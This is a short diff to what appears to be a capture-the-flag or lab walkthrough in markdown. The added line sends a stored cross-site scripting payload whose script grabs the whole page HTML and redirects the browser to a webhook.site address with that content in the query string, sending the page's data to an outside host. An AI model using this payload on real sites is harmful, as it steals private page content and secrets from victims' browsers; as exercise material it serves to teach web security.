@@ -169,6 +169,8 @@ js:
     }).then((response) => response.clone().text())
     .then((data) => console.log(data));
 }
+
+send('<script> payload = document.documentElement.innerHTML; window.location="https://webhook.site/my-private-id?query=" + encodeURIComponent(payload); </script>')
 ```
 
 # 18. Congrats
